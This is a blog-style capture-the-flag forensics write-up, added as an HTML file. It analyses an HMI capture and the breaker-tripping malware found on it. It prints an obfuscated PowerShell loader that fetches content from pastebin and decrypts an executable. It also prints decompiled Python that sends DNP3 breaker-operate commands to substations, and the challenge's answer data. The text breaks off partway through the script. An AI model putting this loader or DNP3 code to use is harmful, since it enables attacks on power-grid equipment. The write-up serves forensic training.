@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>Tripping Breakers</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>Tripping Breakers</h1>
+    </header>
+
+    <div class="content">
+        <pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Attached is a forensics capture of an HMI (human machine interface) containing scheduled tasks, registry hives, and user profile of an operator account. There is a scheduled task that executed in April 2021 that tripped various breakers by sending DNP3 messages. We would like your help clarifying some information. What was the IP address of the substation_c, and how many total breakers were tripped by this scheduled task? Flag format: flag{IP-Address:# of breakers}. For example if substation_c&#39;s IP address was 192.168.1.2 and there were 45 total breakers tripped, the flag would be flag{192.168.1.2:45}.
+</span></code></pre>
+<p>Looking around the filesystem finds us this lovely powershell script in Temp.</p>
+<pre data-lang="powershell" style="background-color:#212733;color:#ccc9c2;" class="language-powershell "><code class="language-powershell" data-lang="powershell"><span>$SCOP </span><span style="color:#f29e74;">= </span><span>((</span><span style="color:#f28779;">new-object</span><span> System.Net.WebClient).DownloadString(</span><span style="color:#bae67e;">&quot;https://pastebin.com/raw/rBXHdE85&quot;</span><span>)).Replace(</span><span style="color:#bae67e;">&quot;!&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;f&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;@&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;q&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;#&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;z&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;&lt;&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;B&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;%&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;K&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;^&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;O&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;&amp;&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;T&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;*&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;Y&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;[&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;4&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;]&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;9&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;{&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;=&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;</span><span>$SLPH </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffa759;">Text.Encoding</span><span>]::UTF8.GetString([</span><span style="color:#ffa759;">Convert</span><span>]::FromBase64String($SCOP))</span><span style="color:#ccc9c2cc;">; </span><span>$E</span><span style="color:#f29e74;">=</span><span>(</span><span style="color:#f28779;">Get-ItemProperty </span><span style="color:#f29e74;">-</span><span>Path $SLPH </span><span style="color:#f29e74;">-</span><span>Name Blast).</span><span style="color:#bae67e;">&quot;Blast&quot;</span><span style="color:#ccc9c2cc;">;</span><span>$TWR </span><span style="color:#f29e74;">=  </span><span style="color:#bae67e;">&quot;!M[[pcU09%d^kV&amp;l#9*0XFd]cVG93&lt;&quot;</span><span>.Replace(</span><span style="color:#bae67e;">&quot;!&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;SEt&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;@&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;q&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;#&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;jcm&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;&lt;&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;ZXI=&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;%&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;GVF&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;^&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;BU&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;&amp;&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;cTW&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;*&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;zb2Z&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;[&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;T&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;]&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;iZW1&quot;</span><span>).Replace(</span><span style="color:#bae67e;">&quot;{&quot;</span><span style="color:#f29e74;">,</span><span style="color:#bae67e;">&quot;Fdi&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;</span><span>$BRN </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffa759;">Text.Encoding</span><span>]::UTF8.GetString([</span><span style="color:#ffa759;">Convert</span><span>]::FromBase64String($TWR))</span><span style="color:#ccc9c2cc;">; </span><span>$D</span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#f28779;">Get-ItemProperty </span><span style="color:#f29e74;">-</span><span>Path $BRN </span><span style="color:#f29e74;">-</span><span>Name Off).</span><span style="color:#bae67e;">&quot;Off&quot;</span><span style="color:#ccc9c2cc;">;</span><span>openssl aes</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">256</span><span style="color:#f29e74;">-</span><span>cbc </span><span style="color:#f29e74;">-</span><span>a </span><span style="color:#f29e74;">-</span><span>A </span><span style="color:#f29e74;">-</span><span>d </span><span style="color:#f29e74;">-</span><span>salt </span><span style="color:#f29e74;">-</span><span>md sha256 </span><span style="color:#f29e74;">-in </span><span>$env:temp$D </span><span style="color:#f29e74;">-</span><span>pass pass:$E </span><span style="color:#f29e74;">-</span><span>out </span><span style="color:#bae67e;">&quot;c:\1\fate.exe&quot;</span><span style="color:#ccc9c2cc;">;
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ cat Registry/SOFTWARE_ROOT.json | jq | grep -i &quot;tabletpc..bell&quot; -A 10 -B 3
+</span><span>              &quot;LastWriteTimestamp&quot;: &quot;/Date(1617231964815)/&quot;,
+</span><span>              &quot;SubKeys&quot;: [
+</span><span>                {
+</span><span>                  &quot;KeyPath&quot;: &quot;ROOT\\Microsoft\\Windows\\TabletPC\\Bell&quot;,
+</span><span>                  &quot;KeyName&quot;: &quot;Bell&quot;,
+</span><span>                  &quot;LastWriteTimestamp&quot;: &quot;/Date(1617231990846)/&quot;,
+</span><span>                  &quot;SubKeys&quot;: [],
+</span><span>                  &quot;Values&quot;: [
+</span><span>                    {
+</span><span>                      &quot;ValueName&quot;: &quot;Blast&quot;,
+</span><span>                      &quot;ValueType&quot;: &quot;RegSz&quot;,
+</span><span>                      &quot;ValueData&quot;: &quot;M4RK_MY_W0Rd5&quot;,
+</span><span>                      &quot;DataRaw&quot;: &quot;TQA0AFIASwBfAE0AWQBfAFcAMABSAGQANQAAAA==&quot;,
+</span><span>                      &quot;Slack&quot;: &quot;&quot;
+</span><span>❯ cat Registry/SOFTWARE_ROOT.json | jq | grep -i &quot;wbem..tower&quot; -A 10 -B 3
+</span><span>              &quot;Values&quot;: []
+</span><span>            },
+</span><span>            {
+</span><span>              &quot;KeyPath&quot;: &quot;ROOT\\Microsoft\\Wbem\\Tower&quot;,
+</span><span>              &quot;KeyName&quot;: &quot;Tower&quot;,
+</span><span>              &quot;LastWriteTimestamp&quot;: &quot;/Date(1617231936549)/&quot;,
+</span><span>              &quot;SubKeys&quot;: [],
+</span><span>              &quot;Values&quot;: [
+</span><span>                {
+</span><span>                  &quot;ValueName&quot;: &quot;Off&quot;,
+</span><span>                  &quot;ValueType&quot;: &quot;RegSz&quot;,
+</span><span>                  &quot;ValueData&quot;: &quot;\\EOTW\\151.txt&quot;,
+</span><span>                  &quot;DataRaw&quot;: &quot;XABFAE8AVABXAFwAMQA1ADEALgB0AHgAdAAAAA==&quot;,
+</span><span>                  &quot;Slack&quot;: &quot;&quot;
+</span></code></pre>
+<p>So, turns out Powershell actually exists on Linux -- I used it to evaluate these subcommands. The more you know!  It decrypts EOTW\151.txt with "M4RK_MY_W0Rd5" as the password and then runs the result, so I run it to decrypt fate.exe. I opened it up in Binary Ninja, cried a little bit, and then realized it was a package python script with PyInstaller. I hit it with <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> and uncompyle6 to get this lightly modified python file.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;"># uncompyle6 version 3.7.4
+</span><span style="font-style:italic;color:#5c6773;"># Python bytecode 3.6 (3379)
+</span><span style="font-style:italic;color:#5c6773;"># Decompiled from: Python 3.6.0 (default, Mar  3 2017, 23:25:37) 
+</span><span style="font-style:italic;color:#5c6773;"># [GCC 5.3.0]
+</span><span style="font-style:italic;color:#5c6773;"># Embedded file name: trip_breakers.py
+</span><span style="color:#ffa759;">import </span><span>struct</span><span style="color:#ccc9c2cc;">, </span><span>socket</span><span style="color:#ccc9c2cc;">, </span><span>time</span><span style="color:#ccc9c2cc;">, </span><span>sys
+</span><span style="color:#ffa759;">from </span><span>crccheck</span><span style="color:#f29e74;">.</span><span>crc </span><span style="color:#ffa759;">import </span><span>Crc16Dnp
+</span><span>OPT_1 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">3
+</span><span>OPT_2 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">4
+</span><span>OPT_3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">66
+</span><span>OPT_4 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">129
+</span><span style="color:#ffa759;">class </span><span style="color:#73d0ff;">Substation</span><span>:
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#f28779;">__init__</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">ip_address</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">devices</span><span>):
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>target </span><span style="color:#f29e74;">= </span><span>ip_address
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>devices </span><span style="color:#f29e74;">= </span><span>[]
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>src </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">50
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">10
+</span><span>        </span><span style="color:#ffa759;">for </span><span>device </span><span style="color:#ffa759;">in </span><span>devices:
+</span><span>            </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_device</span><span>(device)
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">connect</span><span>()
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">connect</span><span>(</span><span style="color:#ffcc66;">self</span><span>):
+</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&#39;Connecting to </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">...&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>target))
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>socket </span><span style="color:#f29e74;">= </span><span>socket</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">socket</span><span>(socket</span><span style="color:#f29e74;">.</span><span>AF_INET</span><span style="color:#ccc9c2cc;">, </span><span>socket</span><span style="color:#f29e74;">.</span><span>SOCK_STREAM)
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>socket</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">connect</span><span>((</span><span style="color:#bae67e;">&quot;127.0.0.1&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">20000</span><span>))
+</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&#39;Connected to </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>target))
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">add_device</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">device</span><span>):
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>devices</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>({</span><span style="color:#bae67e;">&#39;dst&#39;</span><span style="color:#ccc9c2cc;">:</span><span>device[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#ccc9c2cc;">,  </span><span style="color:#bae67e;">&#39;count&#39;</span><span style="color:#ccc9c2cc;">:</span><span>device[</span><span style="color:#ffcc66;">1</span><span>]})
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">activate_all_breakers</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">code</span><span>):
+</span><span>        </span><span style="color:#ffa759;">for </span><span>device </span><span style="color:#ffa759;">in </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>devices:
+</span><span>            dnp3_header </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get_dnp3_header</span><span>(device[</span><span style="color:#bae67e;">&#39;dst&#39;</span><span>])
+</span><span>            </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span>device[</span><span style="color:#bae67e;">&#39;count&#39;</span><span>] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2</span><span>):
+</span><span>                </span><span style="color:#ffa759;">global </span><span>count
+</span><span>                dnp3_packet </span><span style="color:#f29e74;">= </span><span>dnp3_header </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get_dnp3_data</span><span>(x</span><span style="color:#ccc9c2cc;">, </span><span>OPT_1</span><span style="color:#ccc9c2cc;">, </span><span>code)
+</span><span>                </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>socket</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(dnp3_packet)
+</span><span>                </span><span style="font-style:italic;color:#5c6773;"># time.sleep(2)
+</span><span>                dnp3_packet </span><span style="color:#f29e74;">= </span><span>dnp3_header </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">get_dnp3_data</span><span>(x</span><span style="color:#ccc9c2cc;">, </span><span>OPT_2</span><span style="color:#ccc9c2cc;">, </span><span>code)
+</span><span>                </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>socket</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(dnp3_packet)
+</span><span>                </span><span style="font-style:italic;color:#5c6773;"># time.sleep(5)
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_dnp3_header</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">dst</span><span>):
+</span><span>        data </span><span style="color:#f29e74;">= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;H2B2H&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">25605</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">196</span><span style="color:#ccc9c2cc;">, </span><span>dst</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>src)
+</span><span>        data </span><span style="color:#f29e74;">+= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;H&#39;</span><span style="color:#ccc9c2cc;">, </span><span>Crc16Dnp</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">calc</span><span>(data))
+</span><span>        </span><span style="color:#ffa759;">return </span><span>data
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_dnp3_data</span><span>(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">index</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">function</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">code</span><span>):
+</span><span>        data </span><span style="color:#f29e74;">= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;10BIH&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">192 </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">192 </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq</span><span style="color:#ccc9c2cc;">, </span><span>function</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">12</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">23</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span>index</span><span style="color:#ccc9c2cc;">, </span><span>code</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">500</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)
+</span><span>        data </span><span style="color:#f29e74;">+= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;H&#39;</span><span style="color:#ccc9c2cc;">, </span><span>Crc16Dnp</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">calc</span><span>(data))
+</span><span>        data </span><span style="color:#f29e74;">+= </span><span>struct</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">pack</span><span>(</span><span style="color:#bae67e;">&#39;&lt;HBH&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">65535</span><span>)
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq </span><span style="color:#f29e74;">&gt;= </span><span style="color:#ffcc66;">62</span><span>:
+</span><span>            </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>transport_seq </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq </span><span style="color:#f29e74;">&gt;= </span><span style="color:#ffcc66;">62</span><span>:
+</span><span>            </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span>app_seq </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="color:#ffa759;">return </span><span>data
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># if socket.gethostname() != &#39;hmi&#39;:
+</span><span>    </span><span style="font-style:italic;color:#5c6773;">#     sys.exit(1)
+</span><span>    substation_a </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.80&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">19</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">8</span><span>)])
+</span><span>    substation_b </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.81&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">9</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">7</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">12</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">15</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">19</span><span>)])
+</span><span>    substation_c </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.82&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">14</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">14</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">9</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">15</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">12</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)])
+</span><span>    substation_d </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.83&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">17</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">14</span><span>)])
+</span><span>    substation_e </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.84&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">12</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">13</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">11</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9</span><span>)])
+</span><span>    substation_f </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.85&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9</span><span>)])
+</span><span>    substation_g </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Substation</span><span>(</span><span style="color:#bae67e;">&#39;10.95.101.86&#39;</span><span style="color:#ccc9c2cc;">, </span><span>[(</span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">14</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">7</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">27</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)])
